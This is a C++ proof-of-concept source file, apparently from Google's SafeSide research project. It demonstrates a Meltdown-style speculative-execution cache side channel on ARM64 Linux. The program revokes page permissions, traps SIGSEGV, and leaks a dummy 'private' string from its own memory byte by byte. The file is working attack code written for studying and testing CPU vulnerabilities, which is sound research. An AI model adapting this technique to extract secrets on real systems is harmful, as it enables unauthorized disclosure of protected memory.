/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <algorithm>
#include <array>
#include <cstring>
#include <fstream>
#include <iostream>
#include <string>
#include <tuple>
#include <vector>

#ifndef __linux__
#  error Unsupported OS. Linux required.
#endif

#ifndef __aarch64__
#  error Unsupported architecture. ARM64 required.
#endif

#include <linux/membarrier.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "cache_sidechannel.h"
#include "instr.h"

const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";
constexpr size_t PAGE_SIZE = 4096;

// Local handler necessary for avoiding local/global linking mismatches on ARM.
static void local_handler() {
  asm volatile("b afterspeculation");
}

// Function occupying a whole page that accesses the oracle.
__attribute__((aligned(PAGE_SIZE)))
static void access_the_oracle(const std::array<BigByte, 256> &isolated_oracle,
                              const char *data, size_t offset) {
  ForceRead(isolated_oracle.data() + static_cast<size_t>(data[offset]));
}

__attribute__((aligned(PAGE_SIZE)))
static char leak_byte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    // Architecturally access the safe offset.
    access_the_oracle(isolated_oracle, data, safe_offset);

    // Block any access to the oracle.
    mprotect(reinterpret_cast<void *>(access_the_oracle), PAGE_SIZE, PROT_NONE);

    // Sync the changes and wait synchronously for results.
    msync(reinterpret_cast<void *>(access_the_oracle), PAGE_SIZE, MS_SYNC);

    // Make sure that all is synced with a global memory barrier called through
    // an inlined syscall.
    syscall(__NR_membarrier, MEMBARRIER_CMD_SHARED);

    // Jumps to architecturally non-readable and non-executable code.
    // That triggers SIGSEGV. This is speculatively executed before all three
    // syscalls above.
    access_the_oracle(isolated_oracle, data, offset);

    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGSEGV signal handler moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    // Restore read and exec access to the oracle.
    mprotect(reinterpret_cast<void *>(access_the_oracle), PAGE_SIZE,
             PROT_READ | PROT_EXEC);

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

static void sigsegv(
    int /* signum */, siginfo_t * /* siginfo */, void *context) {
  // SIGSEGV signal handler.
  // Moves the instruction pointer to the "afterspeculation" label jumping to
  // the "local_handler" function.
  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
  ucontext->uc_mcontext.pc = reinterpret_cast<greg_t>(local_handler);
}

static void set_signal() {
  struct sigaction act;
  act.sa_sigaction = sigsegv;
  act.sa_flags = SA_SIGINFO;
  sigaction(SIGSEGV, &act, NULL);
}

int main() {
  set_signal();
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << leak_byte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
